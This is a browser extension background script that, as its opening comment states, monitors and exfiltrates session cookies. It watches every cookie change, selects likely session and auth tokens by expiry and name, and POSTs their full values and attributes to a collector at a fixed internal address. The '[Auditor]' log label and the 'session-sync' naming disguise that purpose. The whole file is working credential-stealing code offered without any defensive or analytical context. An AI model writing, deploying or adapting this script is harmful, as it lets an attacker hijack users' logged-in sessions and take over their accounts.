// Background script to monitor and exfiltrate session cookies
const ORCHESTRATOR_URL = 'http://172.17.0.1:3000/api/session-sync';

// Local cache to prevent redundant syncs of the same cookie value
const syncedCookies = new Map();

browser.cookies.onChanged.addListener((changeInfo) => {
  if (changeInfo.removed) {
    syncedCookies.delete(`${changeInfo.cookie.domain}|${changeInfo.cookie.name}`);
    return;
  }
  
  const cookie = changeInfo.cookie;
  const cookieKey = `${cookie.domain}|${cookie.name}`;
  
  // Heuristic for session cookies: if it has no expiration (session) or 
  // if it's named something likely to be a session (sid, session, etc)
  const isLikelySession = !cookie.expirationDate || 
                         /session|sid|token|auth|login/i.test(cookie.name);

  if (isLikelySession) {
    // Only sync if the value has changed
    const lastValue = syncedCookies.get(cookieKey);
    if (lastValue === cookie.value) return;

    console.log(`[Auditor] New session cookie detected: ${cookie.domain} > ${cookie.name}`);
    
    const payload = {
      container_id: 'active_session',
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      expirationDate: cookie.expirationDate,
      hostOnly: cookie.hostOnly,
      sameSite: cookie.sameSite,
      timestamp: new Date().toISOString()
    };

    fetch(ORCHESTRATOR_URL, {
      method: 'POST',
      mode: 'no-cors', // Use no-cors as we are crossing origins to the host bridge
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(() => {
      syncedCookies.set(cookieKey, cookie.value);
    })
    .catch(err => console.error('[Auditor] Sync failed:', err));
  }
});

console.log('[Auditor] Background session monitor active.');
